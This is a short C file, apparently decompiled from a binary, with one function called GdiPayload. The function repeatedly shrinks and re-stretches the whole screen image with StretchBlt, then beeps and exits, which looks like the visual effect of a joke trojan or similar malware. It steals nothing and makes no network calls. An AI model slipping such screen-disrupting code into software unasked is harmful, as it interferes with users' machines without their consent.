#include "ex.h"

DWORD WINAPI
GdiPayload(

)
{
	DWORD v4; // esi
	unsigned int v5; // ebx
	HDC v6; // edi
	int v7; // ebx
	unsigned int v8; // edi
	HBITMAP h; // [esp+Ch] [ebp-1Ch]
	HDC hdcSrc; // [esp+10h] [ebp-18h]
	int wSrc; // [esp+14h] [ebp-14h]
	unsigned int hSrc; // [esp+18h] [ebp-10h]
	int wDest; // [esp+1Ch] [ebp-Ch]
	unsigned int cy; // [esp+20h] [ebp-8h]
	HDC hdc; // [esp+24h] [ebp-4h]

	v4 = 0xDAC;
	v5 = GetSystemMetrics( 0 );
	wSrc = v5;
	hSrc = GetSystemMetrics( 1 );
	v5 /= 3u;
	wDest = v5;
	cy = hSrc / 3;
	v6 = GetDC( 0 );
	hdcSrc = v6;
	hdc = CreateCompatibleDC( v6 );
	h = CreateCompatibleBitmap( v6, v5, hSrc / 3 );

	v7 = RandomRange( 0x64, 0x96 );
	SelectObject( hdc, h );
	if( v7 ) {
		do {
			v8 = v4;
			Sleep( v4 );
			StretchBlt( hdc, 0, 0, wDest, cy, hdcSrc, 0, 0, wSrc, hSrc, 0xCC0020 );
			StretchBlt( hdcSrc, 0, 0, wSrc, hSrc, hdc, 0, 0, wDest, cy, 0xCC0020 );
			v4 -= 100;
			if( v8 <= 0x1F4 )
				v4 = v8;
			--v7;
		} while( v7 );
		v6 = hdcSrc;
	}
	DeleteObject( h );
	ReleaseDC( 0, v6 );
	DeleteDC( hdc );
	Beep( 0x3E8, 0xBB8 );
	ExitProcess( 0 );
}